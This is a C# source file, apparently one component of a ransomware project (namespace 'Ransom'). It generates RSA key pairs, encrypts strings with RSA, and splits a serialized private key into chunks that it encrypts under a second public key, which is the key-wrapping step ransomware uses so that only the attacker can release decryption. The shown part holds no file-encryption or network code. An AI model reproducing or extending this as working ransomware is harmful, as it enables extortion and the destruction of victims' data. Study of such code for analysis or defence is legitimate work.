using Shared;
using System.Text;
using System.Security.Cryptography;

namespace Ransom
{
    class Asymmetric
    {
        private const int DEFAULT_RSA_KEY_SIZE = 4096;

        private RSACryptoServiceProvider? rsa;

        public Asymmetric() { }

        public (RSAParameters, RSAParameters) GenerateKeys(int keySize = DEFAULT_RSA_KEY_SIZE)
        {
            rsa = new(keySize);
            return (rsa.ExportParameters(false), rsa.ExportParameters(true));
        }

        public static byte[]? String2RSA(string data, RSAParameters _publicKey)
        {
            if (string.IsNullOrEmpty(data))
                return null;

            RSACryptoServiceProvider pubKey = new();
            pubKey.ImportParameters(_publicKey);

            byte[] dataAsBytes = Encoding.UTF8.GetBytes(data);
            byte[] encodedData = pubKey.Encrypt(dataAsBytes, true);

            return encodedData;
        }

        public static List<byte[]> RSAKey2RSA(RSAParameters keyToEncrypt, RSAParameters publicKey)
        {
            List<byte[]> totalEncrypted = new();
            string kRepresentation = Utility.KeyToString(keyToEncrypt);

            int n = 126, kLength = kRepresentation.Length;
            for (int i = 0; i < kLength; i += n)
            {
                int last = 0;
                string concatString = "";

                try
                {
                    last = i;
                    concatString = kRepresentation.Substring(i, n);
                }
                catch (ArgumentOutOfRangeException)
                {
                    if (last + n - kLength > 0)
                        concatString = kRepresentation[last..kLength];
                }

                byte[]? encryptedKey = String2RSA(concatString, publicKey);
                if (encryptedKey != null)
                    totalEncrypted.Add(encryptedKey);
            }

            return totalEncrypted;
        }
    }
}